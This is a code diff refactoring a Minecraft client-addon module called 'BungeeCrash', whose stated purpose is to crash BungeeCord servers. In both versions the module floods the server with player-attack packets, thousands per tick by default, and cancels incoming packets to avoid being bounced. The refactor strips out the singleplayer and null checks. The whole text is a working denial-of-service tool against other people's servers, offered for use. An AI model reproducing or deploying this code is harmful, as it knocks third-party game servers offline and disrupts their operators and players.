@@ -13,74 +13,56 @@ import meteordevelopment.orbit.EventHandler;
 import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
 
 public class BungeeCrash extends Module {
-    private final SettingGroup sgGeneral;
-    private final Setting<Integer> amount;
-    private final Setting<Boolean> doCrash;
-    private final Setting<Boolean> preventBungeeBounces;
-    private final Setting<Boolean> autoDisable;
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
-    public BungeeCrash() {
-        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Bungee Crash", "CRYSTAL || Attempts to crash 1.19.3 bungeecord servers.");
-        this.sgGeneral = this.settings.getDefaultGroup();
-
-        this.amount = this.sgGeneral.add((new IntSetting.Builder())
+    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
             .name("amount")
             .description("How many packets to send to the server per tick.")
             .defaultValue(5000)
             .min(1)
             .sliderMin(1)
             .sliderMax(20000)
-            .build());
+            .build()
+    );
 
-        this.doCrash = this.sgGeneral.add((new BoolSetting.Builder())
+    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
             .name("do-crash")
             .description("Does the crash.")
             .defaultValue(true)
-            .build());
+            .build()
+    );
 
-        this.preventBungeeBounces = this.sgGeneral.add((new BoolSetting.Builder())
+    private final Setting<Boolean> preventBungeeBounces = sgGeneral.add(new BoolSetting.Builder()
             .name("prevent-bungee-bounces")
             .description("Prevents bungee bounces client side.")
             .defaultValue(true)
-            .build());
+            .build()
+    );
 
-        this.autoDisable = this.sgGeneral.add((new BoolSetting.Builder())
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
             .name("auto-disable")
             .description("Disables module on kick.")
             .defaultValue(true)
-            .build());
+            .build()
+    );
+
+    public BungeeCrash() {
+        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "bungee-crash", "CRYSTAL || Attempts to crash bungeecord servers.");
     }
 
     @EventHandler
     private void onPacketReceive(PacketEvent.Receive event) {
-        if (this.preventBungeeBounces.get()) {
-            event.setCancelled(true);
-        }
-
+        if (preventBungeeBounces.get()) event.setCancelled(true);
     }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
-        if(!mc.isInSingleplayer()) {
-            if (this.doCrash.get()) {
-                for(int i = 0; i < this.amount.get(); ++i) {
-                    if (this.mc.player != null) {
-                        this.mc.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(this.mc.player, false));
-                    }
-                }
-
-            }
-        } else {
-            error("You must be on a server, toggling.");
-            toggle();
-        }
+        if (!doCrash.get()) return;
+        for (int i = 0; i < amount.get(); i++) mc.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(mc.player, false));
     }
 
     @EventHandler
     private void onGameLeft(GameLeftEvent event) {
-        if (this.autoDisable.get()) {
-            this.toggle();
-        }
-
+        if (autoDisable.get()) toggle();
     }
 }
